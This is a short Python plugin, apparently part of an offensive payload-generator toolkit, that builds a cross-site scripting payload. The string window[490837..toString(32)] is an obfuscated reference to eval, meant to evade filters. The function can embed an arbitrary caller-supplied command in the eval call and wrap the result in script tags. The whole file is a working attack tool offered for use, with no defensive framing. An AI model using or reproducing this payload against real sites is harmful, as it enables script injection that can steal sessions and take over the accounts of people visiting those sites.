"""My favorite XSS gh0st payload to run basically anything."""

from __future__ import annotations

__all__ = ["PLUGIN", "generate"]

PLUGIN = {
    "api_version": "1",
    "type": "generator",
    "kind": "xss_gh0st",
    "entrypoint": "generate",
    "summary": "Gh0st XSS payload to execute commands.",
    "requires_python": [],
    "requires_system": [],
}


def generate(
    tags: bool = False,
    command: str | None = None,
) -> str:
    """
    Gh0st XSS payload to execute commands.

    Author: @gh0st

    Params:
    - tags: If true, wrap the payload in <script></script> tags.
    - command: Optional but if you pass it, it will auto execute the command.

    Returns:
    - Rendered payload string.
    """
    gh0st = "var fn=window[490837..toString(1<<5)];"
    if command:
        gh0st = f"{gh0st}fn('{command}')"
    if tags:
        gh0st = f"<script>{gh0st}</script>"
    return gh0st
